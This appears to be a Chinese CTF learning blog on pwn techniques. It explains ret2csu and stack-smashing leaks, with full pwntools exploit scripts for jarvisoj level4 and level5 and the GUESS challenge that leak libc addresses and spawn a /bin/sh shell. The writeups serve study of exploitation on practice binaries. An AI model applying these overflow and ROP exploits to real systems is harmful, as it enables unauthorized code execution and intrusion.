这里给个网址，官方介绍的很详细了
https://pwntoolsdocinzh-cn.readthedocs.io/en/master/dynelf.html
exp如下：

from pwn import *
context(arch = 'i386', os = 'linux')
r = remote('pwn2.jarvisoj.com', 9880)
e=ELF('./level4')
junk='A'*(0x88+0x04)
read_plt=e.symbols['read']
write_plt=e.symbols['write']
data_bss_addr=e.symbols['__bss_start']
func_reload_addr=e.symbols['vulnerable_function']
def leak(address):
    payload1=junk+p32(write_plt)+p32(func_reload_addr)+p32(0x01)+p32(address)+p32(0x04)
    r.sendline(payload1)
    leak_addr=r.recv(4)
    return leak_addr
d=DynELF(leak,elf=e)
system_addr=d.lookup('system','libc')
payload2=junk+p32(read_plt)+p32(func_reload_addr)+p32(0x00)+p32(data_bss_addr)+p32(0x08)
r.sendline(payload2)
r.send('/bin/sh\x00')
payload3=junk+p32(system_addr)+p32(func_reload_addr)+p32(data_bss_addr)
r.send(payload3)
r.interactive()

pwn学习（9）中级ROP（一）

发表于 2018-11-26 | 分类于 pwn

周六周末简单复习了一下计算机网络的前三章，稍微撇了几眼数据结构，甚至还试着拿angr去做了做某个比赛的逆向题。。。想想自己还有四级需要准备就有点头疼，不过pwn还是得学啊，中级ROP大概会写两次博客吧

ret2csu

原理

不知道大家有没有和我一样的经历，拿到一个64程序，看上去漏洞很明显然后就开始想着拿payload覆盖数据，泄漏libc然后重复调用漏洞函数……怎么说呢，思路倒是没什么错，但是忽视了很重要的问题——64位程序传递参数的方式是优先使用寄存器的（准确的说是前6个参数），多出来的才用栈传递，这就限制了我们不能再简单的去用覆盖数据的方式实现函数的调用了。当然，我们还是可以使用gadgets来凑出来的，但是往往没有是那么合适的，这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。
为什么呢？下面就来看一看

一下内容来自某英文网站http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html

图片为32位，作为参考
从上图我们可以看到，当运行程序的时候，首先shell会使用 execve() 函数来出发系统调用。这时候系统会为我们的程序分配栈区并将argc、argv、envp压栈，按照shell设定fd，装载器还要进行重定位和调用预初始化器（preinitializers），然后就从_start来执行代码了。
利用ida（当然gdb、objdump上面的也一样）来看一下这段代码，重要的部分我都标记了注释

一点一点来看，首先xor了ebp也就是将ebp置为了0，然后紧接着就是pop，也就是将我们的栈顶的值拿了出来，根据之前的execve的压栈方式我们可以知道也就是argc，当我们pop后栈顶就成了argv，一个mov也就让我们成功拿到了，这么说大家也应该明白了，其实之后的几句都是在准备参数。
细致分析下来一共有7个参数，前六个按照x64的准则由rsi、rdi、rdx、rcx、r8、r9来传递，第七个则是利用栈来传递的，其中比较重要的参数应该是main的地址，argc、argv以及__libc_csu_init、__libc_csu_fini

如图所示即调用__libc_start_main时寄存器的情况
至于__libc_start_main函数做了什么呢？首先设置了uid和gid，然后启动线程，寄存fini和rtld_fini的参数，调用__libc_csu_init，调用main，调用exit。
这里就看到了我们调用程序几乎必然要用到这个函数，所以我们可以利用它来传递寄存器的值

例题

题目是jarvis oj上的level5，首先还是file+checksec+ida

漏洞很明显，但程序本身没有system和/bin/sh字符串，所以还是考虑用泄漏libc地址的方式来做。
因为程序用过了write函数我们就考虑泄漏它的地址，利用libc_csu_gadgets实现，并且再次跳转回主函数
计算出libc的地址，进而拿到execve的地址和/bin/sh字符串的地址
再次利用libc_csu_gadgets来将这两个地址写入到bss段，然后执行就好了
官方的exp如下
from pwn import *

#context.log_level = 'debug'

level5 = ELF('./level5.dms')
sh = process('./level5.dms')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
write_got = level5.got['write']
read_got = level5.got['read']
main_addr = level5.symbols['main']
bss_base = level5.bss()
csu_front_addr = 0x0000000000400600
csu_end_addr = 0x000000000040061A
fakeebp = 'b' * 8


def csu(rbx, rbp, r12, r13, r14, r15, last):
    # pop rbx,rbp,r12,r13,r14,r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi=edi=r15d
    # rsi=r14
    # rdx=r13
    payload = 'a' * 0x80 + fakeebp
    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(csu_front_addr)
    payload += 'a' * 0x38
    payload += p64(last)
    sh.send(payload)
    sleep(1)


sh.recvuntil('Hello, World\n')
## RDI, RSI, RDX, RCX, R8, R9, more on the stack
## write(1,write_got,8)
csu(0, 1, write_got, 8, write_got, 1, main_addr)

write_addr = u64(sh.recv(8))
libc_base = write_addr - libc.symbols['write']
execve_addr = libc_base + libc.symbols['execve']
log.success('execve_addr ' + hex(execve_addr))
##gdb.attach(sh)

## read(0,bss_base,16)
## read execve_addr and /bin/sh\x00
sh.recvuntil('Hello, World\n')
csu(0, 1, read_got, 16, bss_base, 0, main_addr)
sh.send(p64(execve_addr) + '/bin/sh\x00')

sh.recvuntil('Hello, World\n')
## execve(bss_base+8)
gdb.attach(sh)
csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)
sh.interactive()

依旧是被各种课塞满的一天……在实验室的一下午其实也没干啥，简单看了一下ctf wiki的中级ROP，主要是想利用周六周末把ROP这部分的理论看完，然后就是做了几道题目，有麻烦一点的也有简单的，主要还是这一周的巩固。

stack smashes练习

题目是网鼎杯的GUESS，算是对stack smashes这个技术的进阶版应用吧，比起ctf wiki给的例题是难了不少，下面就来简单看一下吧

首先保护机制就开启了不少，canary、nx都是开启的，ida中很容易看出有栈溢出漏洞，理所当然的没有/bin/sh字符串，也没有system函数。程序的逻辑很简单，让我们输入三次，但要注意因为太调用了fork函数，这三次其实是三个相同的独立过程。说他相同是因为他们的栈结构、逻辑等等都是一样的，说它独立是因为你哪怕因为canary被覆盖搞崩了其中一个，另外两个也会正常运行。

看了一圈没有leak出canary的机会，那我们就考虑利用smashes来get到点信息，我们首先来简单的调试一下程序，之前做过类似的题目了，我们现在main函数下段来找一下arg0的位置

拿到了arg0的位置，接着尝试在文件操作处下段，主要目的是看看读到的文件内容被存储在了哪里


明显文件的内容被存储到了栈上，那我们就可以想到可以利用smashes的信息来输出栈上的flag。

程序给了三次输入的机会，也就是三个smashes的机会，最终我们的目标是输出栈上的值，虽然开启了保护，但我们知道偏移是一定的，所以我们可以找到flag的偏移，然后只要找到基准值就可以算出来flag的真实地址了，那这个基准值是什么呢？答案就是*environ，他指向了栈的环境变量的位置，而我们可以利用libc来获取到environ的位置。

那就说明我们要分三步走：

  • 利用smashes获取libc中的函数，比如puts
  • 利用smashes获取environ
  • 利用smashes获取flag

那就来看看exp吧

from pwn import *
arg0_addr = 0x7fffffffdf68
input_addr = 0x7fffffffde40
#context.log_level = 'debug'
p = process('./GUESS.dms')
elf = ELF('./GUESS.dms')
e = ELF('/lib/x86_64-linux-gnu/libc.so.6')

flag_addr = 0x7fffffffde10
puts_addr = 0x602020
p.recvuntil('flag')
payload = (arg0_addr - input_addr)*'a' +p64(puts_addr)
p.sendline(payload)
p.recvuntil('*** stack smashing detected ***: ')
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.info(hex(puts_addr))

libc = puts_addr - e.symbols['puts']
environ_addr = libc + e.symbols['__environ']
log.info(hex(libc))

p.recvuntil('flag')
p.sendline((arg0_addr - input_addr)*'a' + p64(environ_addr))
p.recvuntil('*** stack smashing detected ***: ')
stack = u64(p.recv(6).ljust(8, '\x00'))
log.info(hex(stack))

flag_addr = stack - 0x168

p.recvuntil('flag')
p.sendline((arg0_addr - input_addr)*'a' + p64(flag_addr))

p.interactive()

各处都不难，位移需要注意的地方是flag偏移值的计算方式，我们运行起来之后可以在environ处下段点，然后查看stack信息，找到flag字符串的位置手动计算一下就好了.
